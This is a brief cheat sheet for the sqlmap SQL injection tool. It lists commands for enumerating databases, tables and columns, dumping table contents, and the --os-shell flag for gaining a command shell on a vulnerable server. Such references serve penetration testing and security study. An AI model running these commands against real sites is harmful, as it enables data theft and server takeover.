# SQLMAP AUTOMATED SQL INJECTION TOOL

## Commands:

### Database enumeration: sqlmap -U "http://www.example.com/page.php?id=1" --dbs 

### Database Table enumeration: sqlmap -U "http://www.example.com/page.php?id=1" --tables -D DATABASE

### Table columns enumeration:  sqlmap -U "http://www.example.com/page.php?id=1" --columns -D DATABASE -T TABLE

### Table information dumping: sqlmap -U "http://www.example.com/page.php?id=1" --dump -D DATABASE -T TABLE

#### -r HTTP_REQUEST_FILE = Use file from web proxies (Burpsuite) instead of writing entire URL

#### -u = URL 

#### --forms = Parse and test forms

#### --batch = Non-interactive mode (accepts default answers)

#### --crawl = How deep you want to crawl a site

#### --level = Different levels of tests ( Default = 1, Most = 5)

#### --risk = Different risk of tests ( Default = 1, Most = 3)

#### --os-shell = If the server is vulnerable to RCE via SQL Injection, it spawns an interactive shell to execute commands
